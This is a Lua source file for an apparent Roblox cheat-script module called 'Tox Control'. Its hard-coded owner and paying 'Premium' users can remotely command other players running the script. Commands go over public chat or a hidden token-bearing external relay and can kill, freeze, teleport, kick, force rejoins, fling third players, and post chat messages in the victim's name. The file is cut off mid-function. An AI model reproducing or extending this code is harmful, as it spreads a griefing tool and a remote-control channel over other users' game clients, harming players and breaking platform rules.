if getgenv().ToxSystemsLoaded then
    return
end

if not getgenv().ToxUniversalLoaded then
    local notify =
        getgenv().CustomNotify

    if notify then
        notify(
            "Universal.lua must load before ToxSystems.lua",
            Color3.fromRGB(
                255,
                100,
                100
            ),
            5
        )
    end

    return
end

local Players =
    game:GetService("Players")
local UserInputService =
    game:GetService("UserInputService")
local RunService =
    game:GetService("RunService")
local TextChatService =
    game:GetService("TextChatService")
local HttpService =
    game:GetService("HttpService")
local ReplicatedStorage =
    game:GetService("ReplicatedStorage")
local TeleportService =
    game:GetService("TeleportService")
local MarketplaceService =
    game:GetService("MarketplaceService")

local Player = Players.LocalPlayer
local Gui = getgenv().Gui
local FlingPage = getgenv().FlingPage
local MAIN_COLOR =
    getgenv().MAIN_COLOR
local CustomNotify =
    getgenv().CustomNotify
local AddConnection =
    getgenv().AddConnection
local CreateButton =
    getgenv().CreateButton
local Settings =
    getgenv().Settings or {}
local AutoSaveConfiguration =
    getgenv().AutoSaveConfiguration
local ChatAPI =
    getgenv().ToxChatAPI or {}

if not Player
or not Gui
or not FlingPage
or not CustomNotify
or not AddConnection
or not CreateButton then
    return
end

local TOX_OWNER_ID = 2245662672

local TOX_FRIEND_IDS = {
}

local TOX_PREMIUM_IDS = {
}

local TOX_PREMIUM_ASSET_ID =
    70855495297491

local TOX_ROLE_LEVELS = {
    Member = 1,
    Friend = 2,
    Premium = 3,
    Owner = 4
}

local function BuildRoleSet(list)
    local set = {}

    for _, id in ipairs(list) do
        local numeric =
            tonumber(id)

        if numeric
        and numeric > 0 then
            set[
                math.floor(numeric)
            ] = true
        end
    end

    return set
end

local FriendSet =
    BuildRoleSet(
        TOX_FRIEND_IDS
    )

local PremiumSet =
    BuildRoleSet(
        TOX_PREMIUM_IDS
    )

local PremiumAssetCache = {}

local function OwnsToxPremium(
    player
)
    if not player then
        return false
    end

    local userId =
        tonumber(player.UserId)
        or 0

    if PremiumSet[userId] then
        return true
    end

    if PremiumAssetCache[userId]
    ~= nil then
        return PremiumAssetCache[
            userId
        ]
    end

    local owns = false

    pcall(function()
        owns =
            MarketplaceService:
                PlayerOwnsAsset(
                    player,
                    TOX_PREMIUM_ASSET_ID
                )
    end)

    PremiumAssetCache[userId] =
        owns == true

    return PremiumAssetCache[
        userId
    ]
end

local function GetToxRole(player)
    if not player then
        return "Member", 1
    end

    local userId =
        tonumber(player.UserId)
        or 0

    if userId == TOX_OWNER_ID then
        return "Owner", 4
    end

    if OwnsToxPremium(player) then
        return "Premium", 3
    end

    if FriendSet[userId] then
        return "Friend", 2
    end

    return "Member", 1
end

local function CanUseControl(player)
    local _, level =
        GetToxRole(player)

    return level >=
        TOX_ROLE_LEVELS.Friend
end

local function CanControlTarget(
    actor,
    target
)
    if not actor
    or not target then
        return false
    end

    local _, actorLevel =
        GetToxRole(actor)

    local _, targetLevel =
        GetToxRole(target)

    if target.UserId
        == TOX_OWNER_ID
    and actor.UserId
        ~= TOX_OWNER_ID then
        return false
    end

    return actorLevel
        >= targetLevel
end

getgenv().ToxRole =
    select(
        1,
        GetToxRole(Player)
    )

Settings.ToxControlMode =
    tostring(
        Settings.ToxControlMode
        or "HIDDEN"
    )

if Settings.ToxControlMode
~= "CHAT"
and Settings.ToxControlMode
~= "HIDDEN" then
    Settings.ToxControlMode =
        "HIDDEN"
end

local function Save()
    if AutoSaveConfiguration then
        pcall(
            AutoSaveConfiguration
        )
    end
end

local function Trim(text)
    return tostring(text or "")
        :gsub("[\r\n]+", " ")
        :match("^%s*(.-)%s*$")
        or ""
end

local function ResolvePlayer(text)
    local input =
        Trim(text)
            :gsub("^@", "")

    if input == "" then
        return nil
    end

    local lower =
        string.lower(input)
    local partial = nil

    for _, candidate in ipairs(
        Players:GetPlayers()
    ) do
        local name =
            string.lower(
                candidate.Name
            )

        local display =
            string.lower(
                candidate.DisplayName
            )

        if name == lower
        or display == lower then
            return candidate
        end

        if not partial
        and (
            string.find(
                name,
                lower,
                1,
                true
            ) == 1
            or string.find(
                display,
                lower,
                1,
                true
            ) == 1
        ) then
            partial = candidate
        end
    end

    return partial
end

local function SendRobloxChat(
    message
)
    message = Trim(message)

    if message == "" then
        return false
    end

    local sent = false

    pcall(function()
        local config =
            TextChatService:
                FindFirstChild(
                    "ChatInputBarConfiguration"
                )

        local channel =
            config
            and config.TargetTextChannel

        if channel then
            channel:SendAsync(
                message
            )

            sent = true
        end
    end)

    if not sent then
        local events =
            ReplicatedStorage:
                FindFirstChild(
                    "DefaultChatSystemChatEvents"
                )

        local say =
            events
            and events:
                FindFirstChild(
                    "SayMessageRequest"
                )

        if say
        and say:IsA("RemoteEvent") then
            pcall(function()
                say:FireServer(
                    message,
                    "All"
                )

                sent = true
            end)
        end
    end

    return sent
end

local AutoJumpEnabled = false
local AutoJumpConnection = nil
local FrozenByControl = false
local RecentCommands = {}

local function SetAutoJump(enabled)
    AutoJumpEnabled =
        enabled == true

    if AutoJumpConnection then
        AutoJumpConnection:
            Disconnect()

        AutoJumpConnection = nil
    end

    if not AutoJumpEnabled then
        return
    end

    AutoJumpConnection =
        AddConnection(
            RunService.Heartbeat:
                Connect(function()
                    if not AutoJumpEnabled
                    or getgenv().Destroyed
                    or not getgenv().ScriptLoaded then
                        return
                    end

                    local character =
                        Player.Character

                    local humanoid =
                        character
                        and character:
                            FindFirstChildOfClass(
                                "Humanoid"
                            )

                    if humanoid
                    and humanoid.Health > 0
                    and humanoid.FloorMaterial
                        ~= Enum.Material.Air then
                        humanoid.Jump = true
                    end
                end)
        )
end

local function NotifyReceived(
    actor,
    text
)
    CustomNotify(
        "Tox Control • @"
        .. actor.Name
        .. " "
        .. text,
        Color3.fromRGB(
            120,
            210,
            255
        ),
        4
    )
end

local function ExecuteCommand(
    actor,
    command,
    argument
)
    if not actor
    or not CanControlTarget(
        actor,
        Player
    ) then
        return false
    end

    command =
        string.lower(
            Trim(command)
        )

    argument =
        Trim(argument)

    local character =
        Player.Character

    local humanoid =
        character
        and character:
            FindFirstChildOfClass(
                "Humanoid"
            )

    local root =
        character
        and character:
            FindFirstChild(
                "HumanoidRootPart"
            )

    if command == "reset" then
        NotifyReceived(
            actor,
            "used RESET"
        )

        task.delay(0.12, function()
            if humanoid then
                humanoid.Health = 0
            end

            if character
            and character.Parent then
                pcall(function()
                    character:
                        BreakJoints()
                end)
            end
        end)

        return true
    end

    if command == "freeze" then
        if root then
            FrozenByControl =
                not FrozenByControl

            root.Anchored =
                FrozenByControl

            NotifyReceived(
                actor,
                FrozenByControl
                and "enabled FREEZE"
                or "disabled FREEZE"
            )
        end

        return true
    end

    if command == "unfreeze" then
        FrozenByControl = false

        if root then
            root.Anchored = false
        end

        NotifyReceived(
            actor,
            "disabled FREEZE"
        )

        return true
    end

    if command == "bring" then
        local actorRoot =
            actor.Character
            and actor.Character:
                FindFirstChild(
                    "HumanoidRootPart"
                )

        if root
        and actorRoot then
            if getgenv().AllowToxTeleport then
                getgenv().AllowToxTeleport(
                    1.5
                )
            end

            root.CFrame =
                actorRoot.CFrame
                * CFrame.new(
                    0,
                    0,
                    -3
                )

            if getgenv().SetNDSNoTPAnchor then
                pcall(function()
                    getgenv().SetNDSNoTPAnchor(
                        root.CFrame,
                        true
                    )
                end)
            end

            NotifyReceived(
                actor,
                "used BRING"
            )
        end

        return true
    end

    if command == "jump" then
        SetAutoJump(
            not AutoJumpEnabled
        )

        NotifyReceived(
            actor,
            AutoJumpEnabled
            and "enabled JUMP"
            or "disabled JUMP"
        )

        return true
    end

    if command == "unjump" then
        SetAutoJump(false)

        NotifyReceived(
            actor,
            "disabled JUMP"
        )

        return true
    end

    if command == "chat" then
        if argument ~= "" then
            NotifyReceived(
                actor,
                "used CHAT"
            )

            return SendRobloxChat(
                argument
            )
        end

        return false
    end

    if command == "kick" then
        NotifyReceived(
            actor,
            "used KICK"
        )

        task.delay(0.15, function()
            Player:Kick(
                "Tox Control"
            )
        end)

        return true
    end

    if command == "rejoin" then
        NotifyReceived(
            actor,
            "used REJOIN"
        )

        task.delay(0.15, function()
            local ok =
                pcall(function()
                    TeleportService:
                        TeleportToPlaceInstance(
                            game.PlaceId,
                            game.JobId,
                            Player
                        )
                end)

            if not ok then
                pcall(function()
                    TeleportService:
                        Teleport(
                            game.PlaceId,
                            Player
                        )
                end)
            end
        end)

        return true
    end

    if command == "sit" then
        if humanoid then
            humanoid.Sit =
                not humanoid.Sit

            NotifyReceived(
                actor,
                humanoid.Sit
                and "enabled SIT"
                or "disabled SIT"
            )
        end

        return true
    end

    if command == "fling" then
        local target =
            ResolvePlayer(argument)

        if not target
        or not CanControlTarget(
            actor,
            target
        ) then
            return false
        end

        local fling =
            getgenv().ToxExecuteFling

        if not fling then
            return false
        end

        NotifyReceived(
            actor,
            "used FLING on @"
            .. target.Name
        )

        task.spawn(function()
            fling(
                target.Name
            )
        end)

        return true
    end

    return false
end

local function IsDuplicate(
    actor,
    message
)
    local key =
        tostring(actor.UserId)
        .. "|"
        .. string.lower(
            tostring(message or "")
        )

    local now = tick()
    local old =
        RecentCommands[key]

    RecentCommands[key] = now

    for oldKey, timeValue in pairs(
        RecentCommands
    ) do
        if now - timeValue > 3 then
            RecentCommands[
                oldKey
            ] = nil
        end
    end

    return old
        and now - old < 0.75
end

local function HandleChatCommand(
    actor,
    message
)
    if not actor
    or typeof(message)
        ~= "string"
    or IsDuplicate(
        actor,
        message
    ) then
        return false
    end

    local targetText,
        command,
        argument =
        message:match(
            "^%s*%.c%s+(%S+)%s+(%S+)%s*(.-)%s*$"
        )

    if not targetText
    or not command
    or not CanUseControl(actor) then
        return false
    end

    local target =
        ResolvePlayer(
            targetText
        )

    if not target then
        return true
    end

    command =
        string.lower(command)

    if target ~= Player then
        if actor == Player
        and CanControlTarget(
            actor,
            target
        ) then
            CustomNotify(
                "Tox Control • "
                .. string.upper(command)
                .. " -> @"
                .. target.Name,
                Color3.fromRGB(
                    100,
                    255,
                    130
                ),
                3
            )
        end

        return true
    end

    ExecuteCommand(
        actor,
        command,
        argument
    )

    return true
end

local function HookChatPlayer(player)
    AddConnection(
        player.Chatted:
            Connect(function(message)
                HandleChatCommand(
                    player,
                    message
                )
            end)
    )
end

for _, player in ipairs(
    Players:GetPlayers()
) do
    HookChatPlayer(player)
end

AddConnection(
    Players.PlayerAdded:
        Connect(
            HookChatPlayer
        )
)

AddConnection(
    TextChatService.MessageReceived:
        Connect(function(message)
            local source =
                message
                and message.TextSource

            if not source then
                return
            end

            local actor =
                Players:GetPlayerByUserId(
                    source.UserId
                )

            if actor then
                HandleChatCommand(
                    actor,
                    message.Text
                )
            end
        end)
)

local HiddenCommandResults = {}
local HiddenPendingAcks = {}
local HiddenStartedAt = os.time()

local function SendHiddenPacket(
    packet
)
    if not ChatAPI.PublishPayload
    or not ChatAPI.Token then
        return false
    end

    packet.token =
        ChatAPI.Token

    local ok, encoded =
        pcall(function()
            return HttpService:
                JSONEncode(packet)
        end)

    if not ok then
        return false
    end

    local publishOk, sent =
        pcall(
            ChatAPI.PublishPayload,
            encoded
        )

    return publishOk
        and sent == true
end

local function SendHiddenAck(
    payload,
    success
)
    task.spawn(function()
        SendHiddenPacket({
            version = 5,
            kind =
                "toxcontrol_ack",
            nonce =
                tostring(
                    payload.nonce
                    or ""
                ),
            actorUserId =
                tonumber(
                    payload.actorUserId
                ) or 0,
            targetUserId =
                Player.UserId,
            success =
                success == true,
            placeId =
                game.PlaceId,
            jobId =
                game.JobId,
            sentAt =
                os.time()
        })
    end)
end

local function HandleHiddenCommand(
    payload
)
    if typeof(payload)
        ~= "table"
    or payload.kind
        ~= "toxcontrol"
    or tonumber(
        payload.targetUserId
    ) ~= Player.UserId
    or tonumber(
        payload.placeId
    ) ~= game.PlaceId
    or tostring(
        payload.jobId or ""
    ) ~= tostring(
        game.JobId
    ) then
        return false
    end

    local sentAt =
        tonumber(
            payload.sentAt
        ) or 0

    if sentAt < HiddenStartedAt - 2
    or math.abs(
        os.time() - sentAt
    ) > 45 then
        return true
    end

    local nonce =
        tostring(
            payload.nonce or ""
        )

    if nonce == "" then
        return true
    end

    if HiddenCommandResults[
        nonce
    ] ~= nil then
        SendHiddenAck(
            payload,
            HiddenCommandResults[
                nonce
            ]
        )

        return true
    end

    local actor =
        Players:GetPlayerByUserId(
            tonumber(
                payload.actorUserId
            ) or 0
        )

    if not actor
    or not CanUseControl(actor)
    or not CanControlTarget(
        actor,
        Player
    ) then
        HiddenCommandResults[
            nonce
        ] = false

        SendHiddenAck(
            payload,
            false
        )

        return true
    end

    local success =
        ExecuteCommand(
            actor,
            payload.command,
            payload.argument
        ) == true

    HiddenCommandResults[
        nonce
    ] = success

    SendHiddenAck(
        payload,
        success
    )

    return true
end

local function HandleHiddenAck(
    payload
)
    if typeof(payload)
        ~= "table"
    or payload.kind
        ~= "toxcontrol_ack"
    or tonumber(
        payload.actorUserId
    ) ~= Player.UserId
    or tonumber(
        payload.placeId
    ) ~= game.PlaceId
    or tostring(
        payload.jobId or ""
    ) ~= tostring(
        game.JobId
    ) then
        return false
    end

    local nonce =
        tostring(
            payload.nonce or ""
        )

    if nonce == ""
    or HiddenPendingAcks[
        nonce
    ] == nil then
        return true
    end

    HiddenPendingAcks[
        nonce
    ] =
        payload.success == true

    return true
end

ChatAPI.HandleControlPayload =
    function(payload)
        if typeof(payload)
            ~= "table" then
            return false
        end

        if payload.kind
            == "toxcontrol" then
            return HandleHiddenCommand(
                payload
            )
        end

        if payload.kind
            == "toxcontrol_ack" then
            return HandleHiddenAck(
                payload
            )
        end

        return false
    end

if ChatAPI.RegisterHandler then
    ChatAPI.RegisterHandler(
        "toxcontrol",
        HandleHiddenCommand
    )

    ChatAPI.RegisterHandler(
        "toxcontrol_ack",
        HandleHiddenAck
    )
end

local function SendHiddenControl(
    target,
    command,
    argument
)
    if not target
    or not ChatAPI.PublishPayload
    or not ChatAPI.Token then
        return false
    end

    local nonce =
        HttpService:
            GenerateGUID(false)

    HiddenPendingAcks[
        nonce
    ] = "waiting"

    local sent =
        SendHiddenPacket({
            version = 5,
            kind = "toxcontrol",
            nonce = nonce,
            actorUserId =
                Player.UserId,
            actorName =
                Player.Name,
            targetUserId =
                target.UserId,
            command =
                tostring(
                    command or ""
                ),
            argument =
                tostring(
                    argument or ""
                ),
            placeId =
                game.PlaceId,
            jobId =
                game.JobId,
            sentAt =
                os.time()
        })

    if not sent then
        HiddenPendingAcks[
            nonce
        ] = nil

        return false
    end

    local mode =
        tostring(
            ChatAPI.TransportMode
            or ""
        )

    local timeout =
        mode == "WEBSOCKET"
        and 6
        or 10

    local started =
        tick()

    while tick() - started
        < timeout do
        local state =
            HiddenPendingAcks[
                nonce
            ]

        if state == true then
            HiddenPendingAcks[
                nonce
            ] = nil

            return true
        end

        if state == false then
            HiddenPendingAcks[
                nonce
            ] = nil

            return false
        end

        task.wait(0.1)
    end

    HiddenPendingAcks[
        nonce
    ] = nil

    return false
end

local function BuildChatCommand(
    target,
    command,
    argument
)
    local message =
        ".c "
        .. target.Name
        .. " "
        .. command

    argument =
        Trim(argument)

    if argument ~= "" then
        message =
            message
            .. " "
            .. argument
    end

    return message
end

local function SendControl(
    target,
    command,
    argument
)
    if not target
    or not CanControlTarget(
        Player,
        target
    ) then
        return false
    end

    local mode =
        Settings.ToxControlMode

    local success = false

    if mode == "CHAT" then
        success =
            SendRobloxChat(
                BuildChatCommand(
                    target,
                    command,
                    argument
                )
            )
    else
        success =
            SendHiddenControl(
                target,
                command,
                argument
            )
    end

    if success then
        CustomNotify(
            "Tox Control • "
            .. string.upper(
                command
            )
            .. " -> @"
            .. target.Name,
            Color3.fromRGB(
                100,
                255,
                130
            ),
            3
        )
    else
        CustomNotify(
            mode == "HIDDEN"
            and "Tox Control hidden: target did not confirm"
            or "Tox Control chat command failed",
            Color3.fromRGB(
                255,
                180,
                70
            ),
            4
        )
    end

    return success
end

local function GotoPlayer(target)
    local root =
        Player.Character
        and Player.Character:
            FindFirstChild(
                "HumanoidRootPart"
            )

    local targetRoot =
        target
        and target.Character
        and target.Character:
            FindFirstChild(
                "HumanoidRootPart"
            )

    if not root
    or not targetRoot then
        return false
    end

    if getgenv().AllowToxTeleport then
        getgenv().AllowToxTeleport(
            1.5
        )
    end

    root.CFrame =
        targetRoot.CFrame
        * CFrame.new(
            0,
            0,
            -3
        )

    if getgenv().SetNDSNoTPAnchor then
        pcall(function()
            getgenv().SetNDSNoTPAnchor(
                root.CFrame,
                true
            )
        end)
    end

    CustomNotify(
        "Tox Control • GOTO -> @"
        .. target.Name,
        Color3.fromRGB(
            100,
            255,
            130
        ),
        3
    )

    return true
end

local function MakeCorner(
    object,
    radius
)
    local corner =
        Instance.new("UICorner")

    corner.CornerRadius =
        UDim.new(
            0,
            radius or 5
        )

    corner.Parent = object
end

local function InitToxControlGui()
    local controlGui =
        Instance.new("Frame")

    controlGui.Name =
        "ToxControlFrame"

    controlGui.Size =
        UDim2.new(
            0,
            380,
            0,
            430
        )

    controlGui.Position =
        UDim2.new(
            0.5,
            -190,
            0.5,
            -215
        )

    controlGui.BackgroundColor3 =
        Color3.fromRGB(
            10,
            10,
            16
        )

    controlGui.BorderSizePixel = 0
    controlGui.ClipsDescendants = true
    controlGui.Visible = false
    controlGui.Parent = Gui

    MakeCorner(
        controlGui,
        8
    )

    local stroke =
        Instance.new("UIStroke")

    stroke.Color = MAIN_COLOR
    stroke.Thickness = 2
    stroke.Parent = controlGui

    local topBar =
        Instance.new("Frame")

    topBar.Size =
        UDim2.new(
            1,
            0,
            0,
            32
        )

    topBar.BackgroundColor3 =
        MAIN_COLOR

    topBar.BorderSizePixel = 0
    topBar.Parent = controlGui

    local title =
        Instance.new("TextLabel")

    title.Size =
        UDim2.new(
            1,
            -80,
            1,
            0
        )

    title.Position =
        UDim2.new(
            0,
            10,
            0,
            0
        )

    title.BackgroundTransparency = 1
    title.Text = "Tox Control"
    title.TextColor3 =
        Color3.fromRGB(
            255,
            255,
            255
        )

    title.Font =
        Enum.Font.GothamBold

    title.TextSize = 13
    title.TextXAlignment =
        Enum.TextXAlignment.Left

    title.Parent = topBar

    local close =
        Instance.new("TextButton")

    close.Size =
        UDim2.new(
            0,
            28,
            0,
            24
        )

    close.Position =
        UDim2.new(
            1,
            -34,
            0,
            4
        )

    close.BackgroundColor3 =
        Color3.fromRGB(
            30,
            30,
            42
        )

    close.BorderSizePixel = 0
    close.Text = "X"
    close.TextColor3 =
        Color3.fromRGB(
            255,
            255,
            255
        )

    close.Font =
        Enum.Font.GothamBold

    close.TextSize = 11
    close.Parent = topBar

    MakeCorner(
        close,
        4
    )

    local roleLabel =
        Instance.new("TextLabel")

    roleLabel.Size =
        UDim2.new(
            1,
            -20,
            0,
            20
        )

    roleLabel.Position =
        UDim2.new(
            0,
            10,
            0,
            40
        )

    roleLabel.BackgroundTransparency = 1
    roleLabel.TextColor3 =
        Color3.fromRGB(
            210,
            210,
            225
        )

    roleLabel.Font =
        Enum.Font.GothamMedium

    roleLabel.TextSize = 10
    roleLabel.TextXAlignment =
        Enum.TextXAlignment.Left

    roleLabel.Parent = controlGui

    local targetBox =
        Instance.new("TextBox")

    targetBox.Size =
        UDim2.new(
            1,
            -20,
            0,
            30
        )

    targetBox.Position =
        UDim2.new(
            0,
            10,
            0,
            66
        )

    targetBox.BackgroundColor3 =
        Color3.fromRGB(
            20,
            20,
            30
        )

    targetBox.BorderSizePixel = 0
    targetBox.Text = ""
    targetBox.PlaceholderText =
        "Nick"

    targetBox.TextColor3 =
        Color3.fromRGB(
            255,
            255,
            255
        )

    targetBox.PlaceholderColor3 =
        Color3.fromRGB(
            130,
            130,
            145
        )

    targetBox.Font =
        Enum.Font.Gotham

    targetBox.TextSize = 11
    targetBox.ClearTextOnFocus = false
    targetBox.Parent = controlGui

    MakeCorner(
        targetBox,
        5
    )

    local targetInfo =
        Instance.new("TextLabel")

    targetInfo.Size =
        UDim2.new(
            1,
            -20,
            0,
            18
        )

    targetInfo.Position =
        UDim2.new(
            0,
            10,
            0,
            99
        )

    targetInfo.BackgroundTransparency = 1
    targetInfo.Text =
        "Target: none"

    targetInfo.TextColor3 =
        Color3.fromRGB(
            155,
            155,
            170
        )

    targetInfo.Font =
        Enum.Font.Gotham

    targetInfo.TextSize = 9
    targetInfo.TextXAlignment =
        Enum.TextXAlignment.Left

    targetInfo.Parent = controlGui

    local modeChat =
        Instance.new("TextButton")

    local modeHidden =
        Instance.new("TextButton")

    modeChat.Size =
        UDim2.new(
            0,
            70,
            0,
            25
        )

    modeHidden.Size =
        UDim2.new(
            0,
            70,
            0,
            25
        )

    modeChat.Position =
        UDim2.new(
            1,
            -150,
            0,
            38
        )

    modeHidden.Position =
        UDim2.new(
            1,
            -76,
            0,
            38
        )

    for _, button in ipairs({
        modeChat,
        modeHidden
    }) do
        button.BorderSizePixel = 0
        button.TextColor3 =
            Color3.fromRGB(
                255,
                255,
                255
            )

        button.Font =
            Enum.Font.GothamBold

        button.TextSize = 9
        button.AutoButtonColor = false
        button.Parent = controlGui

        MakeCorner(
            button,
            4
        )
    end

    modeChat.Text = "CHAT"
    modeHidden.Text = "HIDDEN"

    local selectedTarget = nil

    local function RefreshRole()
        local role =
            select(
                1,
                GetToxRole(Player)
            )

        getgenv().ToxRole = role

        roleLabel.Text =
            "@"
            .. Player.Name
            .. " • "
            .. role
    end

    local function RefreshMode()
        local mode =
            Settings.ToxControlMode

        modeChat.BackgroundColor3 =
            mode == "CHAT"
            and Color3.fromRGB(
                50,
                180,
                70
            )
            or Color3.fromRGB(
                28,
                28,
                42
            )

        modeHidden.BackgroundColor3 =
            mode == "HIDDEN"
            and Color3.fromRGB(
                50,
                180,
                70
            )
            or Color3.fromRGB(
                28,
                28,
                42
            )
    end

    local function RefreshTarget()
        selectedTarget =
            ResolvePlayer(
                targetBox.Text
            )

        if selectedTarget then
            local role =
                select(
                    1,
                    GetToxRole(
                        selectedTarget
                    )
                )

            targetInfo.Text =
                "Target: @"
                .. selectedTarget.Name
                .. " • "
                .. role
        else
            targetInfo.Text =
                "Target: none"
        end

        return selectedTarget
    end

    targetBox.FocusLost:
        Connect(
            RefreshTarget
        )

    modeChat.MouseButton1Click:
        Connect(function()
            Settings.ToxControlMode =
                "CHAT"

            RefreshMode()
            Save()
        end)

    modeHidden.MouseButton1Click:
        Connect(function()
            Settings.ToxControlMode =
                "HIDDEN"

            RefreshMode()
            Save()
        end)

    local function MakeButton(
        text,
        x,
        y,
        width,
        callback
    )
        local button =
            Instance.new(
                "TextButton"
            )

        button.Size =
            UDim2.new(
                0,
                width,
                0,
                32
            )

        button.Position =
            UDim2.new(
                0,
                x,
                0,
                y
            )

        button.BackgroundColor3 =
            Color3.fromRGB(
                20,
                20,
                30
            )

        button.BorderSizePixel = 0
        button.Text = text
        button.TextColor3 =
            Color3.fromRGB(
                245,
                245,
                245
            )

        button.Font =
            Enum.Font.GothamMedium

        button.TextSize = 9
        button.Parent = controlGui

        MakeCorner(
            button,
            5
        )

        button.MouseButton1Click:
            Connect(callback)

        return button
    end

    local function Remote(
        command,
        argument
    )
        local target =
            RefreshTarget()

        if not target
        or not CanControlTarget(
            Player,
            target
        ) then
            return
        end

        SendControl(
            target,
            command,
            argument
        )
    end

    MakeButton(
        "RESET",
        10,
        124,
        66,
        function()
            Remote(
                "reset"
            )
        end
    )

    MakeButton(
        "FREEZE",
        80,
        124,
        66,
        function()
            Remote(
                "freeze"
            )
        end
    )

    MakeButton(
        "BRING",
        150,
        124,
        66,
        function()
            Remote(
                "bring"
            )
        end
    )

    MakeButton(
        "GOTO",
        220,
        124,
        66,
        function()
            local target =
                RefreshTarget()

            if target then
                GotoPlayer(
                    target
                )
            end
        end
    )

    MakeButton(
        "JUMP",
        290,
        124,
        80,
        function()
            Remote(
                "jump"
            )
        end
    )

    MakeButton(
        "KICK",
        10,
        162,
        85,
        function()
            Remote(
                "kick"
            )
        end
    )

    MakeButton(
        "REJOIN",
        100,
        162,
        85,
        function()
            Remote(
                "rejoin"
            )
        end
    )

    MakeButton(
        "SIT",
        190,
        162,
        85,
        function()
            Remote(
                "sit"
            )
        end
    )

    MakeButton(
        "UNFREEZE",
        280,
        162,
        90,
        function()
            Remote(
                "unfreeze"
            )
        end
    )

    local chatBox =
        Instance.new("TextBox")

    chatBox.Size =
        UDim2.new(
            1,
            -92,
            0,
            32
        )

    chatBox.Position =
        UDim2.new(
            0,
            10,
            0,
            204
        )

    chatBox.BackgroundColor3 =
        Color3.fromRGB(
            20,
            20,
            30
        )

    chatBox.BorderSizePixel = 0
    chatBox.Text = ""
    chatBox.PlaceholderText =
        "Chat text"

    chatBox.TextColor3 =
        Color3.fromRGB(
            255,
            255,
            255
        )

    chatBox.PlaceholderColor3 =
        Color3.fromRGB(
            130,
            130,
            145
        )

    chatBox.Font =
        Enum.Font.Gotham

    chatBox.TextSize = 10
    chatBox.ClearTextOnFocus = false
    chatBox.Parent = controlGui

    MakeCorner(
        chatBox,
        5
    )

    MakeButton(
        "SEND",
        292,
        204,
        78,
        function()
            local message =
                Trim(
                    chatBox.Text
                )

            if message ~= "" then
                Remote(
                    "chat",
                    message
                )
            end
        end
    )

    local flingBox =
        Instance.new("TextBox")

    flingBox.Size =
        UDim2.new(
            1,
            -92,
            0,
            32
        )

    flingBox.Position =
        UDim2.new(
            0,
            10,
            0,
            242
        )

    flingBox.BackgroundColor3 =
        Color3.fromRGB(
            20,
            20,
            30
        )

    flingBox.BorderSizePixel = 0
    flingBox.Text = ""
    flingBox.PlaceholderText =
        "Fling target"

    flingBox.TextColor3 =
        Color3.fromRGB(
            255,
            255,
            255
        )

    flingBox.PlaceholderColor3 =
        Color3.fromRGB(
            130,
            130,
            145
        )

    flingBox.Font =
        Enum.Font.Gotham

    flingBox.TextSize = 10
    flingBox.ClearTextOnFocus = false
    flingBox.Parent = controlGui

    MakeCorner(
        flingBox,
        5
    )

    MakeButton(
        "FLING",
        292,
        242,
        78,
        function()
            local flingTarget =
                ResolvePlayer(
                    flingBox.Text
                )

            if not flingTarget
            or not CanControlTarget(
                Player,
                flingTarget
            ) then
                return
            end

            Remote(
                "fling",
                flingTarget.Name
            )
        end
    )

    local examples =
        Instance.new("TextLabel")

    examples.Size =
        UDim2.new(
            1,
            -20,
            0,
            60
        )

    examples.Position =
        UDim2.new(
            0,
            10,
            0,
            284
        )

    examples.BackgroundTransparency = 1
    examples.Text =
        ".c FGIII reset  |  .c FGIII jump\n"
        .. ".c FGIII fling batata\n"
        .. ".c FGIII chat hello"

    examples.TextColor3 =
        Color3.fromRGB(
            145,
            145,
            160
        )

    examples.Font =
        Enum.Font.Gotham

    examples.TextSize = 9
    examples.TextWrapped = true
    examples.TextXAlignment =
        Enum.TextXAlignment.Left

    examples.TextYAlignment =
        Enum.TextYAlignment.Top

    examples.Parent = controlGui

    local locked =
        Instance.new("Frame")

    locked.Size =
        UDim2.new(
            1,
            0,
            1,
            -32
        )

    locked.Position =
        UDim2.new(
            0,
            0,
            0,
            32
        )

    locked.BackgroundColor3 =
        Color3.fromRGB(
            10,
            10,
            16
        )

    locked.BackgroundTransparency = 0.04
    locked.BorderSizePixel = 0
    locked.ZIndex = 20
    locked.Parent = controlGui

    local lockedTitle =
        Instance.new("TextLabel")

    lockedTitle.Size =
        UDim2.new(
            1,
            -30,
            0,
            40
        )

    lockedTitle.Position =
        UDim2.new(
            0,
            15,
            0.5,
            -65
        )

    lockedTitle.BackgroundTransparency = 1
    lockedTitle.Text =
        "Buy Premium to Use"

    lockedTitle.TextColor3 =
        Color3.fromRGB(
            255,
            255,
            255
        )

    lockedTitle.Font =
        Enum.Font.GothamBold

    lockedTitle.TextSize = 20
    lockedTitle.ZIndex = 21
    lockedTitle.Parent = locked

    local lockedInfo =
        Instance.new("TextLabel")

    lockedInfo.Size =
        UDim2.new(
            1,
            -40,
            0,
            42
        )

    lockedInfo.Position =
        UDim2.new(
            0,
            20,
            0.5,
            -20
        )

    lockedInfo.BackgroundTransparency = 1
    lockedInfo.Text =
        "Own the Tox Premium shirt to unlock Tox Control."

    lockedInfo.TextColor3 =
        Color3.fromRGB(
            170,
            170,
            185
        )

    lockedInfo.Font =
        Enum.Font.Gotham

    lockedInfo.TextSize = 10
    lockedInfo.TextWrapped = true
    lockedInfo.ZIndex = 21
    lockedInfo.Parent = locked

    local buy =
        Instance.new("TextButton")

    buy.Size =
        UDim2.new(
            0,
            180,
            0,
            34
        )

    buy.Position =
        UDim2.new(
            0.5,
            -90,
            0.5,
            38
        )

    buy.BackgroundColor3 =
        MAIN_COLOR

    buy.BorderSizePixel = 0
    buy.Text = "BUY PREMIUM"
    buy.TextColor3 =
        Color3.fromRGB(
            255,
            255,
            255
        )

    buy.Font =
        Enum.Font.GothamBold

    buy.TextSize = 11
    buy.ZIndex = 21
    buy.Parent = locked

    MakeCorner(
        buy,
        5
    )

    local function RefreshLock()
        PremiumAssetCache[
            Player.UserId
        ] = nil

        RefreshRole()

        locked.Visible =
            not CanUseControl(
                Player
            )
    end

    buy.MouseButton1Click:
        Connect(function()
            MarketplaceService:
                PromptPurchase(
                    Player,
                    TOX_PREMIUM_ASSET_ID
                )
        end)

    AddConnection(
        MarketplaceService.
            PromptPurchaseFinished:
            Connect(function(
                player,
                assetId,
                purchased
            )
                if player == Player
                and tonumber(assetId)
                    == TOX_PREMIUM_ASSET_ID
                and purchased then
                    PremiumAssetCache[
                        Player.UserId
                    ] = true

                    RefreshLock()

                    CustomNotify(
                        "Tox Premium unlocked",
                        Color3.fromRGB(
                            100,
                            255,
                            130
                        ),
                        4
                    )
                end
            end)
    )

    close.MouseButton1Click:
        Connect(function()
            controlGui.Visible =
                false
        end)

    local dragging = false
    local dragStart = nil
    local startPosition = nil

